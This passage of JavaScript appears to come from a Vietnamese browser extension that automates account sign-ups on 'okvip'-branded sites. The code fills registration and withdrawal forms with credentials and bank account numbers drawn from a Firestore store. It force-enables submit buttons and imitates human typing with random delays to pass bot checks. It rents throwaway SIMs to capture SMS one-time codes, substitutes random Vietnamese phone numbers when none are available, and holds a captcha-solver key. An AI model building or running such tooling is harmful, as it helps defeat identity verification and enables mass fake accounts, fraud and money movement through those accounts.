    await typeText(document.querySelector("#confirmpassword"), password);
    await typeText(document.querySelector("#pin"), withdrawPw);
    await typeText(document.querySelector("#confirmpin"), withdrawPw);
    await typeText(document.querySelector("#firstname"), name);
    await typeText(document.querySelector("#email"), email);
    await typeText(document.querySelector("input[name='username']"), username);
    await typeText(document.querySelector("input[name='password']"), password);
    await typeText(document.querySelector("input[name='confimpsw']"), password);
    await typeText(document.querySelector("input[name='pwdRepeat']"), password);
    await typeText(document.querySelector("input[name='repassword']"), password);
    await typeText(document.querySelector("input[name='password2']"), password);
    await typeText(document.querySelector("input[name='payeeName']"), name);
    await typeText(document.querySelector("input[name='mobileNum1']"), phone);
    await typeText(document.querySelector("input[name='email']"), email);
    await typeText(document.querySelector("input[name='bankCard']"), stk);
    await typeText(document.querySelector("input[name='customBankBranch']"), city);
    await typeText(document.querySelector("input[name='withdraw']"), withdrawPw);
    await typeText(document.querySelector("input[name='withdrawT']"), withdrawPw);
    await typeText(document.querySelector("input[data-input-name='account']"), username);
    await typeText(document.querySelector("input[data-input-name='userpass']"), password);
    await typeText(document.querySelector("input[data-input-name='realName']"), name);
    await typeText(document.querySelector(".ui-password-input__input"), withdrawPw);
    await typeText(document.querySelector("input[placeholder='Vui lòng nhập số tài khoản ngân hàng']"), stk);
    const bdEl = document.querySelector("input[ng-model='$ctrl.user.birthday.value']") ||
                 document.querySelector("input[formcontrolname='birthday']");
    if (bdEl) {
      const bdVal = birthday || bdEl.value || "2000/04/08";
      const parts = bdVal.split("/");
      if (parts.length === 3) { parts[2] = "1"; bdEl.value = parts.join("/"); ["input","change"].forEach(ev => bdEl.dispatchEvent(new Event(ev,{bubbles:true}))); }
    }
    await sleep(300);
    const sub = document.querySelector("button[type='submit'],button.btn-primary,button.btn-default,button[translate='Shared_Submit']");
    if (sub) { sub.removeAttribute("disabled"); sub.removeAttribute("ng-disabled"); sub.click(); }
  }

  function getReactProps(el) {
    const key = Object.keys(el).find(k => k.startsWith("__reactProps"));
    return key ? el[key] : null;
  }

  async function typeIntoInput(input, text) {
    if (!input) return false;
    const nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
    input.click(); await fspeedSleep(60);
    input.focus(); await fspeedSleep(rand(80, 140));
    nativeSetter.call(input, "");

    const props = getReactProps(input);
    if (props && props.onChange) {
      nativeSetter.call(input, text);
      props.onChange({ target: input, currentTarget: input, bubbles: true, type: "change" });
      await fspeedSleep(50);
      input.dispatchEvent(new Event("input", { bubbles: true }));
      input.dispatchEvent(new Event("change", { bubbles: true }));
      await fspeedSleep(100);
      input.dispatchEvent(new FocusEvent("blur", { bubbles: true }));
      await fspeedSleep(50);
      input.dispatchEvent(new FocusEvent("focus", { bubbles: true }));
      return true;
    }

    input.dispatchEvent(new Event("input", { bubbles: true }));
    await fspeedSleep(rand(30, 60));
    for (const char of text) {
      const keyCode = char.charCodeAt(0);
      const code = char >= "0" && char <= "9" ? `Digit${char}` : `Key${char.toUpperCase()}`;
      input.dispatchEvent(new KeyboardEvent("keydown",  { key: char, code, keyCode, which: keyCode, bubbles: true, cancelable: true, composed: true }));
      await fspeedSleep(7);
      input.dispatchEvent(new KeyboardEvent("keypress", { key: char, code, keyCode, which: keyCode, charCode: keyCode, bubbles: true, cancelable: true, composed: true }));
      await fspeedSleep(4);
      nativeSetter.call(input, input.value + char);
      input.dispatchEvent(new InputEvent("beforeinput", { inputType: "insertText", data: char, bubbles: true, cancelable: true }));
      input.dispatchEvent(new InputEvent("input",       { inputType: "insertText", data: char, bubbles: true, cancelable: false, composed: true }));
      await fspeedSleep(5);
      input.dispatchEvent(new KeyboardEvent("keyup",    { key: char, code, keyCode, which: keyCode, bubbles: true, cancelable: true, composed: true }));
      await fspeedSleep(rand(35, 90));
    }
    await fspeedSleep(rand(100, 180));
    input.dispatchEvent(new Event("change", { bubbles: true }));
    await fspeedSleep(rand(50, 100));
    input.dispatchEvent(new FocusEvent("blur",  { bubbles: true }));
    await fspeedSleep(50);
    input.dispatchEvent(new FocusEvent("focus", { bubbles: true }));
    return true;
  }

  function clearInputValue(el) {
    if (!el) return;
    try {
      const nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
      const props = getReactProps(el);
      nativeSetter.call(el, "");
      if (props && props.onChange) {
        props.onChange({ target: el, currentTarget: el, bubbles: true, type: "change" });
      }
      el.dispatchEvent(new Event("input", { bubbles: true }));
      el.dispatchEvent(new Event("change", { bubbles: true }));
    } catch (e) {}
  }

  // Điền STK rồi quét lại giá trị thực tế trong ô. Nếu khác với STK cần điền
  // (bị site tự sửa, ghi đè, hoặc gõ lỗi) thì tự xóa trắng và dán/gõ lại,
  // tối đa maxTries lần.
  async function fillStkVerified(value, maxTries = 3) {
    const target = String(value || "").trim();
    if (!target) return false;
    for (let i = 0; i < maxTries; i++) {
      let el = getStkInput();
      if (!el) { await sleep(150); continue; }
      await typeIntoInput(el, target);
      await sleep(220);
      // Quét lại: DOM có thể đã bị re-render nên lấy lại input mới nhất
      const check = getStkInput() || el;
      const curVal = String((check && check.value) || "").trim();
      if (curVal === target) return true;
      // Không khớp -> xóa trắng rồi lặp lại
      clearInputValue(check);
      await sleep(150);
    }
    return false;
  }

  // =====================================================
  // ========== FETCH ACCOUNTS + GROUPS (Firebase REST) ==========
  // =====================================================

  async function fetchAccounts() {
    const cfg = await getFirebaseConfig();
    if (!cfg) return [];
    const url = `https://firestore.googleapis.com/v1/projects/${cfg.projectId}/databases/(default)/documents/accounts?key=${cfg.apiKey}&pageSize=300`;
    try {
      const res = await fetch(url);
      const json = await res.json();
      if (!json.documents) return [];
      return json.documents.map(doc => {
        const f = doc.fields || {};
        const docId = doc.name.split('/').pop();
        return {
          id: docId,
          name: f.name?.stringValue || "",
          account: f.account?.stringValue || "",
          tag: f.tag?.stringValue || "",
          tgChatId: f.tgChatId?.stringValue || ""
        };
      }).filter(a => a.name);
    } catch (e) { return []; }
  }

  async function fetchGroups() {
    const cfg = await getFirebaseConfig();
    if (!cfg) return [];
    const url = `https://firestore.googleapis.com/v1/projects/${cfg.projectId}/databases/(default)/documents/groups?key=${cfg.apiKey}&pageSize=100`;
    try {
      const res = await fetch(url);
      const json = await res.json();
      if (!json.documents) return [];
      return json.documents.map(doc => {
        const f = doc.fields || {};
        const docId = doc.name.split('/').pop();
        const memberIds = (f.memberIds?.arrayValue?.values || []).map(v => v.stringValue || "").filter(Boolean);
        return { id: docId, name: f.name?.stringValue || "", memberIds };
      }).filter(g => g.name);
    } catch (e) { return []; }
  }

  // =====================================================
  // ========== SHOW PICKER WITH GROUP FILTER ==========
  // =====================================================

  let pickerOpen = false;
  async function showPicker(onSelect) {
    if (pickerOpen) return;
    pickerOpen = true;

    const overlay = document.createElement("div");
    overlay.style.cssText = "position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,0.45);display:flex;align-items:center;justify-content:center;";

    const box = document.createElement("div");
    box.style.cssText = "background:#fff;border-radius:12px;width:90vw;max-width:400px;max-height:88vh;display:flex;flex-direction:column;box-shadow:0 8px 32px rgba(0,0,0,0.25);overflow:hidden;font-family:-apple-system,Arial,sans-serif;";
    box.innerHTML = `
      <div style="padding:14px 16px;background:#f60;color:#fff;font-weight:700;font-size:15px;display:flex;justify-content:space-between;align-items:center;">
        📋 Chọn tài khoản
        <button id="__pk_close__" style="background:none;border:none;color:#fff;font-size:22px;cursor:pointer;line-height:1;">✕</button>
      </div>
      <div id="__pk_group_bar__" style="position:relative;padding:8px 10px;border-bottom:1px solid #eee;background:#fafafa;">
        <span style="font-size:12px;color:#bbb;font-style:italic;">⏳ Đang tải nhóm...</span>
      </div>
      <div style="padding:8px 12px;border-bottom:1px solid #eee;">
        <input id="__pk_search__" type="text" placeholder="🔍 Tìm tên hoặc STK..." style="width:100%;padding:9px 10px;border:1.5px solid #ddd;border-radius:8px;font-size:14px;outline:none;box-sizing:border-box;"/>
      </div>
      <div id="__pk_count__" style="font-size:11px;color:#aaa;text-align:right;padding:3px 14px 0;min-height:16px;"></div>
      <div id="__pk_list__" style="overflow-y:auto;flex:1;padding:4px 0;-webkit-overflow-scrolling:touch;">
        <div style="text-align:center;padding:20px;color:#aaa;font-size:13px;">⏳ Đang tải tài khoản...</div>
      </div>
    `;
    overlay.appendChild(box);
    document.body.appendChild(overlay);

    const close = () => { overlay.remove(); pickerOpen = false; };
    overlay.addEventListener("click", e => { if (e.target === overlay) close(); });
    box.querySelector("#__pk_close__").addEventListener("click", close);

    // Load data song song
    const [accounts, groups] = await Promise.all([fetchAccounts(), fetchGroups()]);

    // null = đang xem "Tất cả", string = đang xem tài khoản của nhóm đó
    let activeGroupId = null;
    let dropdownOpen = false;

    // ── Render thanh chọn nhóm (dropdown, danh sách dọc) ──
    function renderGroupBar() {
      const bar = box.querySelector("#__pk_group_bar__");
      bar.style.cssText = "position:relative;padding:8px 10px;border-bottom:1px solid #eee;background:#fafafa;";

      const currentLabel = activeGroupId === null
        ? "🗂️ Tất cả"
        : `👥 ${(groups.find(g => g.id === activeGroupId)?.name) || ""}`;

      bar.innerHTML = `
        <button id="__pk_group_toggle__" type="button" style="display:flex;align-items:center;gap:8px;width:100%;padding:9px 12px;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer;border:1.5px solid ${activeGroupId !== null ? '#f60' : '#ddd'};background:${activeGroupId !== null ? '#fff3ea' : '#fff'};color:${activeGroupId !== null ? '#f60' : '#555'};text-align:left;outline:none;">
          <span style="flex:1;">${currentLabel}</span>
          <span id="__pk_group_arrow__" style="font-size:11px;color:#aaa;transition:transform .2s;">▼</span>
        </button>
        <div id="__pk_group_dropdown__" style="display:none;position:absolute;top:calc(100% + 4px);left:10px;right:10px;background:#fff;border:1.5px solid #eee;border-radius:8px;box-shadow:0 6px 18px rgba(0,0,0,0.12);z-index:10;max-height:260px;overflow-y:auto;flex-direction:column;"></div>
      `;

      const toggleBtn = bar.querySelector("#__pk_group_toggle__");
      const dropdown  = bar.querySelector("#__pk_group_dropdown__");
      const arrow     = bar.querySelector("#__pk_group_arrow__");

      // Build dropdown rows (vertical list)
      let rowsHtml = `
        <div class="__pk_g_row__" data-gid="" style="padding:11px 14px;cursor:pointer;border-bottom:1px solid #f5f5f5;font-size:13px;font-weight:${activeGroupId===null?'700':'600'};color:${activeGroupId===null?'#f60':'#333'};display:flex;justify-content:space-between;align-items:center;">
          <span>🗂️ Tất cả</span><span style="font-size:11px;color:#aaa;">${accounts.length}</span>
        </div>`;
      if (groups.length === 0) {
        rowsHtml += `<div style="padding:14px;text-align:center;color:#bbb;font-size:12px;font-style:italic;">Chưa có nhóm nào</div>`;
      } else {
        groups.forEach(g => {
          const cnt = g.memberIds.filter(id => accounts.find(a => a.id === id)).length;
          rowsHtml += `
            <div class="__pk_g_row__" data-gid="${g.id}" style="padding:11px 14px;cursor:pointer;border-bottom:1px solid #f5f5f5;font-size:13px;font-weight:${activeGroupId===g.id?'700':'600'};color:${activeGroupId===g.id?'#f60':'#333'};display:flex;justify-content:space-between;align-items:center;">
              <span style="white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">👥 ${g.name}</span><span style="font-size:11px;color:#aaa;flex-shrink:0;margin-left:8px;">${cnt}</span>
            </div>`;
        });
      }
      dropdown.innerHTML = rowsHtml;

      const setDropdown = (open) => {
        dropdownOpen = open;
        dropdown.style.display = open ? "flex" : "none";
        dropdown.style.flexDirection = "column";
        arrow.style.transform = open ? "rotate(180deg)" : "rotate(0deg)";
      };
      setDropdown(dropdownOpen);

      toggleBtn.addEventListener("click", (e) => {
        e.stopPropagation();
        setDropdown(!dropdownOpen);
      });

      dropdown.querySelectorAll(".__pk_g_row__").forEach(row => {
        row.addEventListener("mouseenter", () => row.style.background = "#fff8f0");
        row.addEventListener("mouseleave", () => row.style.background = "");
        row.addEventListener("click", () => {
          const gid = row.getAttribute("data-gid");
          activeGroupId = gid || null;
          setDropdown(false);
          renderGroupBar();
          renderAccountList(getFiltered());
        });
      });
    }

    // ── Lấy danh sách sau khi lọc ──
    function getFiltered() {
      const kw = (box.querySelector("#__pk_search__").value || "").trim().toLowerCase();
      let list = accounts;

      if (activeGroupId !== null) {
        const g = groups.find(x => x.id === activeGroupId);
        const ids = g ? g.memberIds : [];
        list = list.filter(a => ids.includes(a.id));
      }

      if (kw) {
        list = list.filter(a =>
          a.name.toLowerCase().includes(kw) || a.account.includes(kw) || a.tag.toLowerCase().includes(kw)
        );
      }

      return list;
    }

    // ── Render danh sách tài khoản ──
    function renderAccountList(list) {
      const listEl  = box.querySelector("#__pk_list__");
      const countEl = box.querySelector("#__pk_count__");

      const totalInScope = activeGroupId !== null
        ? (groups.find(g => g.id === activeGroupId)?.memberIds || []).filter(id => accounts.find(a => a.id === id)).length
        : accounts.length;

      countEl.textContent = (activeGroupId !== null || box.querySelector("#__pk_search__").value.trim())
        ? `Hiển thị ${list.length} / ${totalInScope}`
        : "";

      if (!list.length) {
        listEl.innerHTML = activeGroupId !== null
          ? `<div style="text-align:center;padding:24px 16px;color:#aaa;font-size:13px;">
               👥 Nhóm này chưa có tài khoản nào.<br>
               <span style="font-size:11px;color:#ccc;">Thêm tài khoản vào nhóm từ trang quản lý.</span>
             </div>`
          : `<div style="text-align:center;padding:20px;color:#aaa;font-size:13px;">Không có kết quả</div>`;
        return;
      }

      listEl.innerHTML = "";
      list.forEach(a => {
        const myGroups = groups.filter(g => g.memberIds.includes(a.id));
        const groupBadges = myGroups.length
          ? `<div style="display:flex;flex-wrap:wrap;gap:3px;margin-top:3px;">${
              myGroups.map(g =>
                `<span style="background:#ede8fd;color:#7c3aed;border-radius:20px;padding:1px 7px;font-size:10px;font-weight:700;">👥 ${g.name}</span>`
              ).join('')
            }</div>`
          : '';

        const row = document.createElement("div");
        row.style.cssText = "padding:11px 14px;cursor:pointer;border-bottom:1px solid #f5f5f5;display:flex;justify-content:space-between;align-items:center;gap:8px;";
        row.innerHTML = `
          <div style="min-width:0;flex:1;">
            <div style="font-weight:700;font-size:14px;color:#111;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${a.name}</div>
            <div style="font-size:12px;color:#888;font-family:monospace;">${a.account}</div>
            ${groupBadges}
          </div>
          <span style="background:#d7eaff;color:#1a73e8;font-size:11px;font-weight:700;padding:3px 8px;border-radius:20px;margin-left:4px;flex-shrink:0;">${a.tag}</span>
        `;
        row.addEventListener("touchstart", () => row.style.background = "#fff8f0", { passive: true });
        row.addEventListener("touchend",   () => row.style.background = "", { passive: true });
        row.addEventListener("mouseenter", () => row.style.background = "#fff8f0");
        row.addEventListener("mouseleave", () => row.style.background = "");
        row.addEventListener("click", () => { onSelect(a); close(); });
        listEl.appendChild(row);
      });
    }

    box.addEventListener("click", (e) => {
      const bar = box.querySelector("#__pk_group_bar__");
      if (dropdownOpen && bar && !bar.contains(e.target)) {
        dropdownOpen = false;
        const dd = bar.querySelector("#__pk_group_dropdown__");
        const arrow = bar.querySelector("#__pk_group_arrow__");
        if (dd) dd.style.display = "none";
        if (arrow) arrow.style.transform = "rotate(0deg)";
      }
    });

    // Init — hiện luôn danh sách "Tất cả" tài khoản
    renderGroupBar();
    renderAccountList(getFiltered());

    box.querySelector("#__pk_search__").addEventListener("input", () => {
      renderAccountList(getFiltered());
    });
  }


  // =====================================================

  const LAST_ACCOUNT_KEY  = "okvip_last_account";
  const LAST_USERNAME_KEY = "okvip_last_username";

  async function getHardPhone() {
    let v = "";
    try { v = localStorage.getItem("okvip_hard_phone") || ""; } catch(e) {}
    if (!v) { try { v = await new Promise(res => chrome.storage.local.get(["okvip_hard_phone"], s => res(s["okvip_hard_phone"] || ""))); } catch(e) {} }
    return v;
  }

  async function getHardUsername() {
    let v = "";
    try { v = localStorage.getItem("okvip_hard_username") || ""; } catch(e) {}
    if (!v) {
      try { v = await new Promise(res => chrome.storage.local.get(["okvip_hard_username"], s => res(s["okvip_hard_username"] || ""))); } catch(e) {}
    }
    return v;
  }

  const LAST_PHONE_KEY    = "okvip_last_phone";
  const LAST_STK_KEY      = "okvip_last_stk";
  const LAST_NAME_KEY     = "okvip_last_name_real";

  MK.state.lastSelectedAccount = (() => {
    try {
      const v = localStorage.getItem(LAST_ACCOUNT_KEY) || sessionStorage.getItem(LAST_ACCOUNT_KEY);
      return JSON.parse(v || "null");
    } catch(e) { return null; }
  })();

  function setLastAccount(account) {
    MK.state.lastSelectedAccount = account;
    MK.state._bankSelectDone = false;
    try { localStorage.setItem(LAST_ACCOUNT_KEY, JSON.stringify(account)); } catch(e) {}
    try { sessionStorage.setItem(LAST_ACCOUNT_KEY, JSON.stringify(account)); } catch(e) {}
    try {
      chrome.storage.local.set({
        [LAST_STK_KEY]:  account.account,
        [LAST_NAME_KEY]: account.name,
        okvip_account_tg_chatid: account.tgChatId || "",
      });
    } catch(e) {}
    const stkBtn = document.getElementById("__mk_stk_btn__");
    if (stkBtn) {
      stkBtn.innerHTML = `💳 ${account.name.split(" ").pop()}`;
      stkBtn.style.background = "#2e7d32";
      setTimeout(() => { stkBtn.innerHTML = "💳 Điền STK"; stkBtn.style.background = "#f60"; }, 2000);
    }
  }

  // =====================================================

  // =====================================================
  // ========== PHẦN 2: SIM / OTP TOOL ==========
  // =====================================================

  const SIM_KEY         = "okvip_sims";
  const CURRENT_SIM_KEY = "okvip_current_sim";
  const API_KEY_STORE   = "okvip_api_key";
  const CAPTCHA_KEY_STORE = "okvip_captcha_api_key";
  const ANTICAPTCHA_API = "https://anticaptcha.top/api/captcha";

  const WORKER          = "https://api.dblgamingg.workers.dev";
  const SV2_BASE        = "https://noisy-darkness-b3aa.dblgamingg.workers.dev/api";
  const FIXED_SVC       = 49;
  const APP_ID          = 1200;

  const STK_EXCLUDE = /tài khoản ngân hàng|so tai khoan|số tài khoản|account number|bank account|stk|bankCard|bankcard/i;

  function findPhoneInput() {
    const direct = document.querySelector('input[data-input-name="phone"]');
    if (direct) return direct;
    const byClass = document.querySelector('input.mobile-input, input[class*="mobile-input"], input[class*="phone-input"]');
    if (byClass) return byClass;
    const tel = document.querySelector('input[type="tel"]');
    if (tel) return tel;
    const byMobile = document.querySelector('input[formcontrolname="mobile"]');
    if (byMobile) return byMobile;
    const byNgMobile = document.querySelector("input[ng-model='$ctrl.user.mobile.value']");
    if (byNgMobile) return byNgMobile;
    const byMobileNum1 = document.querySelector("input[name='mobileNum1']");
    if (byMobileNum1) return byMobileNum1;
    const byTel = document.querySelector('input[type="tel"].inputText, input[type="tel"][placeholder*="điện thoại"], input[type="tel"][placeholder*="Điện thoại"], input[type="tel"][placeholder*="phone"]');
    if (byTel) return byTel;
    const KW = /phone|mobile|sdt|điện thoại|dien thoai|số đt|nhập sđt|nhap sdt|nhập số điện|nhap so dien|số điện|so dien/i;
    const all = [...document.querySelectorAll('input[type="text"],input[type="number"],input[type="tel"]')];
    const byAttr = all.find(el => {
      const combined = [
        el.placeholder||"", el.name||"", el.id||"",
        el.getAttribute("data-input-name")||"",
        el.getAttribute("aria-label")||"",
        el.getAttribute("data-label-name")||"",
        el.className||""
      ].join(" ");
      if (STK_EXCLUDE.test(combined)) return false;
      return KW.test(combined);
    });
    if (byAttr) return byAttr;
    for (const el of all) {
      const attrCombined = [el.placeholder||"", el.name||"", el.id||"", el.getAttribute("data-label-name")||""].join(" ");
      if (STK_EXCLUDE.test(attrCombined)) continue;
      if (el.id) {
        const lbl = document.querySelector(`label[for="${el.id}"]`);
        if (lbl && KW.test(lbl.textContent||"")) return el;
      }
      const parentLbl = el.closest("label");
      if (parentLbl && KW.test(parentLbl.textContent||"")) return el;
      const container = el.closest("div,li,td,tr,section");
      if (container && KW.test(container.textContent||"")) return el;
    }
    return null;
  }

  function findOtpInput() {
    const byData = document.querySelector('input[data-input-name="phoneCode"], input[data-input-name="otp"], input[data-input-name="sms"]');
    if (byData) return byData;
    const bySms = [...document.querySelectorAll('input')].find(el =>
      /nhập mã sms|nhap ma sms/i.test(el.placeholder||"")
    );
    if (bySms) return bySms;
    const KW = /otp|m[aã].? ?x[aá]c|verif|sms/i;
    const CAPTCHA_SKIP = /captcha|xác minh|xac minh/i;
    return [...document.querySelectorAll('input[type="text"],input[type="number"],input[type="tel"]')]
      .find(el => {
        if (el.getAttribute("formcontrolname") === "checkCode") return false;
        const allAttrs = [el.placeholder||"", el.id||"", el.name||""].join(" ");
        if (CAPTCHA_SKIP.test(allAttrs)) return false;
        return KW.test(el.placeholder||"") || KW.test(el.name||"") ||
               KW.test(el.id||"") || KW.test(el.getAttribute("data-input-name")||"") ||
               KW.test(el.getAttribute("aria-label")||"");
      }) || null;
  }

  const stripZero = p => p.startsWith("0") ? p.slice(1) : p;

  function getPhonePrefix(el) {
    if (!el) return null;
    const val = el.value || "";
    const m = val.match(/^(\+\d{1,3})\s*/);
    if (m) return m[1];
    const ph = el.placeholder || "";
    const mp = ph.match(/^(\+\d{1,3})\s/);
    if (mp) return mp[1];
    return null;
  }

  function toLocalDigits(phone) {
    return phone.replace(/^\+84/, "").replace(/^0/, "");
  }

  function fillInput(el, val) {
    if (!el) return false;
    el.focus(); el.select();
    try {
      const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value')?.set;
      if (setter) setter.call(el, val); else el.value = val;
    } catch(e) { el.value = val; }
    ['focus','input','change','blur'].forEach(ev =>
      el.dispatchEvent(new Event(ev, { bubbles: true, cancelable: true }))
    );
    el.dispatchEvent(new KeyboardEvent('keydown',  { bubbles: true, cancelable: true }));
    el.dispatchEvent(new KeyboardEvent('keypress', { bubbles: true, cancelable: true }));
    el.dispatchEvent(new KeyboardEvent('keyup',    { bubbles: true, cancelable: true }));
    return true;
  }

  const getStorage = keys => Promise.resolve(Object.fromEntries(keys.map(k => [k, localStorage.getItem(k)])));
  const setStorage = obj => { Object.entries(obj).forEach(([k,v]) => localStorage.setItem(k, v)); return Promise.resolve(); };

  function detectType(key) {
    if (!key) return null;
    if (key.startsWith("eyJ") && key.split(".").length === 3) return "okvip";
    if (/^[a-f0-9]{32}$/i.test(key)) return "sv2";
    return null;
  }

  async function callOkvip(path) { return (await fetch(WORKER + path)).json(); }
  async function callSv2(apiKey, params) { return (await fetch(SV2_BASE + "?" + new URLSearchParams({apik: apiKey, ...params}))).json(); }

  async function cancelSim(sim, apiKey) {
    try {
      if (sim.source === "okvip") await callOkvip(`/cancel?api_key=${apiKey}&sim_id=${sim.simId}`);
      else await callSv2(apiKey, {act:"expired", id:sim.otpId});
    } catch(e) {}
  }

  async function rentNewSim(apiKey, type) {
    showToast("⏳ Đang thuê SIM...", "info");
    for (let i = 0; i < 3; i++) {
      try {
        if (type === "okvip") {
          const d = await callOkvip(`/get-sim?api_key=${apiKey}&service_id=${FIXED_SVC}`);
          if (d?.status !== 200) continue;
          return { phone: d.data.phone, simObj: { source:"okvip", otpId:d.data.otpId, simId:d.data.simId, phone:d.data.phone, code:null, done:false } };
        } else {
          const d = await callSv2(apiKey, {act:"number", appId:APP_ID});
          if (d?.ResponseCode !== 0) continue;
          const phone = "0" + d.Result.Number;
          return { phone, simObj: { source:"sv2", otpId:d.Result.Id, simId:d.Result.Id, phone, code:null, done:false } };
        }
      } catch(e) {}
      await new Promise(r => setTimeout(r, 1500));
    }
    showToast("❌ Kho số tạm hết", "error");
    return null;
  }

  function genRandomVNPhone() {
    const prefixes = [
      "032","033","034","035","036","037","038","039",
      "086","096","097","098",
      "070","076","077","078","079",
      "089","090","093",
      "081","082","083","084","085",
      "088","091","094",
      "052","056","058","092",
      "059","099",
      "055","066"
    ];
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    let suffix = "";
    for (let i = 0; i < 7; i++) suffix += Math.floor(Math.random() * 10);
    return prefix + suffix;
  }

  async function pollOtp(sim, apiKey, btn) {
    const maxTry = 30; let count = 0;
    return new Promise(resolve => {
      const timer = setInterval(async () => {
        count++;
        if (count > maxTry) {
          clearInterval(timer);
          btn.textContent = "⏰ Hết giờ"; btn.style.background = "#dc3545";
          resolve(null); return;
        }
        try {
          let code = null;
          if (sim.source === "okvip") {
            const d = await callOkvip(`/get-otp?api_key=${apiKey}&otp_id=${sim.otpId}`);
            const m = (d?.data?.content||"").match(/\b\d{4,8}\b/);
            if (m) code = m[0];
          } else {
            const d = await callSv2(apiKey, {act:"code", id:sim.otpId});
            if (d?.ResponseCode === 0 && d?.Result?.Code) code = d.Result.Code;
          }
          if (code) {
            clearInterval(timer);
            btn.textContent = `✅ OTP ${code}`; btn.style.background = "#28a745";
            fillInput(findOtpInput(), code);
            sim.code = code; sim.done = true;
            setStorage({[CURRENT_SIM_KEY]: JSON.stringify(sim)});
            resolve(code);
          }
        } catch(e) {}
      }, 4000);
    });
  }

  function needsLeadingZero(el) {
    if (!el) return false;
    return el.name === "mobileNum1" || el.classList.contains("form-mobileNum");
  }

  function doFillPhone(phone) {
    const phoneEl = findPhoneInput();
    if (!phoneEl) return;
    const prefix = getPhonePrefix(phoneEl);
    if (prefix) {
      const localDigits = toLocalDigits(phone);
      const fullVal = prefix + localDigits;
      try {
        const nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
        phoneEl.focus();
        nativeSetter.call(phoneEl, fullVal);
        ["input", "change"].forEach(ev => phoneEl.dispatchEvent(new Event(ev, { bubbles: true })));
      } catch(e) { phoneEl.value = fullVal; }
      setTimeout(async () => {
        if (!phoneEl.value || phoneEl.value === prefix) await typeIntoInput(phoneEl, fullVal);
      }, 300);
      return;
    }
    const keepZero = needsLeadingZero(phoneEl);
    const val = keepZero ? phone : stripZero(phone);
    fillInput(phoneEl, val);
    setTimeout(async () => {
      if (!phoneEl.value) await typeIntoInput(phoneEl, val);
      setTimeout(async () => {
        if (!phoneEl.value) await typeIntoInput(phoneEl, phone);
      }, 500);
    }, 300);
  }

  async function handleFillPhoneClick() {
    const hardPhone = await getHardPhone();
    if (hardPhone) {
      const phoneEl = findPhoneInput();
      if (phoneEl) {
        await typeIntoInput(phoneEl, hardPhone);
        try { chrome.storage.local.set({[LAST_PHONE_KEY]: hardPhone}); } catch(e) {}
        showToast("📱 SĐT cứng: " + hardPhone, "success");
      } else {
        showToast("❌ Không tìm thấy ô SĐT", "error");
      }
      return;
    }
    const { [API_KEY_STORE]:apiKey, [CURRENT_SIM_KEY]:currentRaw } = await getStorage([API_KEY_STORE, CURRENT_SIM_KEY]);
    const type = detectType(apiKey);
    if (!apiKey || !type) { showToast("❌ API key lỗi", "error"); return; }
    let currentSim = null;
    try { currentSim = JSON.parse(currentRaw || "null"); } catch(e) {}
    const phoneEl     = findPhoneInput();
    const isVerifyStep = /\d+\*\d+/.test(phoneEl?.placeholder || "");
    if (isVerifyStep) {
      if (currentSim?.phone) { showToast(`♻️ Dùng lại ${currentSim.phone}`, "info"); doFillPhone(currentSim.phone); }
      else showToast("❌ Chưa có SIM", "error");
      return;
    }
    if (phoneEl?.value) fillInput(phoneEl, "");
    if (currentSim) await cancelSim(currentSim, apiKey);
    const res = await rentNewSim(apiKey, type);
    if (!res) {
      const randPhone = genRandomVNPhone();
      showToast(`🎲 Random SĐT: ${randPhone}`, "info");
      try { chrome.storage.local.set({[LAST_PHONE_KEY]: randPhone}); } catch(e) {}
      doFillPhone(randPhone);
      return;
    }
    setStorage({[CURRENT_SIM_KEY]: JSON.stringify(res.simObj)});
    showToast(`✅ ${res.phone}`, "success");
    try { chrome.storage.local.set({[LAST_PHONE_KEY]: res.phone}); } catch(e) {}
    doFillPhone(res.phone);
  }

  async function handleOtpClick() {
    const { [CURRENT_SIM_KEY]:raw, [API_KEY_STORE]:apiKey } = await getStorage([CURRENT_SIM_KEY, API_KEY_STORE]);
    let sim = null;
    try { sim = JSON.parse(raw || "null"); } catch(e) {}
    if (!sim) { showToast("❌ Chưa có SIM", "error"); return; }
    const btn = document.querySelector('[data-mk-btn="okvip-btn-otp"]');
    btn.textContent = "⏳ Đang chờ"; btn.style.background = "#6c757d";
    await pollOtp(sim, apiKey, btn);
  }

  // =====================================================
  // ========== TOAST ==========
  // =====================================================

  function showToast(msg, type) {
    document.getElementById("mk-toast-global")?.remove();
    const colors = { success:"#28a745", error:"#dc3545", info:"#007bff" };
    const t = document.createElement("div");
    t.id = "mk-toast-global";
    t.textContent = msg;
    t.style.cssText = `position:fixed;bottom:24px;left:50%;transform:translateX(-50%);z-index:99999;padding:10px 20px;border-radius:20px;font-size:13px;font-weight:bold;color:#fff;background:${colors[type]||"#333"};pointer-events:none;font-family:-apple-system,Arial,sans-serif;`;
    document.body.appendChild(t);
    setTimeout(() => t.remove(), 2500);
  }

  // =====================================================
  // ========== INJECT BUTTONS ==========
  // =====================================================

  function injectBankBtn(inputFn, btnId, wrapperId, label, color, onClick) {
    if (document.getElementById(btnId)) return;
    const input = inputFn();
    if (!input) return;
    if (isWithdrawInput(input)) return;
    if (input.parentNode?.id === wrapperId) return;
    const w = document.createElement("div");
    w.id = wrapperId;
    w.style.cssText = "position:relative;display:block;width:100%;";
    input.parentNode.insertBefore(w, input);
    w.appendChild(input);
    input.style.paddingRight = "110px";
    const btn = document.createElement("button");
    btn.id = btnId; btn.type = "button"; btn.innerHTML = label;
    Object.assign(btn.style, {
      position:"absolute", right:"4px", top:"50%", transform:"translateY(-50%)",
      background: color || "#f60", color:"#fff", border:"none", borderRadius:"6px",
      padding:"6px 10px", cursor:"pointer", fontWeight:"700", fontSize:"12px",
      zIndex:"9999", whiteSpace:"nowrap", touchAction:"manipulation"
    });
    btn.addEventListener("mousedown", e => e.preventDefault());
    btn.addEventListener("click", () => onClick(btn));
    w.appendChild(btn);
  }

  function injectSimBtn(inputEl, id, label, color, handler) {
    if (!inputEl) return;
    const parent = inputEl.parentElement;
    if (!parent) return;
